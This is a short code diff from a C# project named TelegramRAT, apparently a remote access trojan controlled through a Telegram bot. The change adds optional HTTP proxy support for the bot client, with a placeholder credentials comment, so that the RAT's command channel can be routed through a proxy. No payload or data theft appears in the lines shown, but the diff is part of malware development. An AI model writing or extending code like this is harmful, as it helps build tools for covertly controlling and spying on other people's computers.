@@ -14,9 +14,27 @@ namespace TelegramRAT
         private static string apiToken = config.TelegramToken;
         private static string chatID = config.TelegramChatID;
 
+        // Proxy
+        private static WebProxy httpProxy = new WebProxy(config.HttpProxyAddress, config.HttpProxyPort)
+        {
+            // Credentials = new NetworkCredential("USERNAME", "PASSWORD")
+        };
 
-        // Bot
-        private static TelegramBotClient bot = new TelegramBotClient(apiToken);
+        // Get bot (for proxy)
+        public static TelegramBotClient getBot()
+        {
+            if (config.HttpProxyEnabled)
+            {
+                return new TelegramBotClient(apiToken, httpProxy);
+            } else
+            {
+                return new TelegramBotClient(apiToken);
+            }
+        }
+
+
+        // init Bot
+        private static TelegramBotClient bot = getBot();
 
         // Wait commands
         public static void waitCommands()
